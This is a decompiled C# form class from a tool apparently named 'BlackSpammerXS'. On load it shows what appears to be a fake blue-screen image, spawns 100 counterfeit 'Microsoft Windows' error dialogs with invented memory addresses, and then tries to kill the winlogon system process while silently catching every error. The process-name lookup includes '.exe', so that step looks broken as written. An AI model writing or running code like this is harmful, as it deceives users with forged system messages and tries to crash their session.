using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackSpammerXS
{
	// Token: 0x020000AE RID: 174
	public partial class ZaschModeBSOD : Form
	{
		// Token: 0x060002E6 RID: 742 RVA: 0x00036810 File Offset: 0x00034A10
		public ZaschModeBSOD()
		{
			this.InitializeComponent();
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x00036828 File Offset: 0x00034A28
		private async void ZaschModeBSOD_Load(object sender, EventArgs e)
		{
			await Task.Delay(1000);
			this.BackgroundImage = this.pictureBox1.Image;
			ZaschModeBSOD.<>c__DisplayClass1_0 CS$<>8__locals1 = new ZaschModeBSOD.<>c__DisplayClass1_0();
			CS$<>8__locals1.c = 0;
			while (CS$<>8__locals1.c < 100)
			{
				Task.Run(delegate
				{
					try
					{
						MessageBox.Show("Error of " + (7809 / CS$<>8__locals1.c).ToString() + " at memory address 0x000e8101f", "Microsoft Windows", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					catch
					{
					}
				});
				CS$<>8__locals1.c++;
			}
			CS$<>8__locals1 = null;
			await Task.Delay(1000);
			try
			{
				Process.GetProcessesByName("winlogon.exe")[0].Kill();
			}
			catch
			{
			}
			await Task.Delay(150);
			Application.Exit();
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x00002067 File Offset: 0x00000267
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}
	}
}
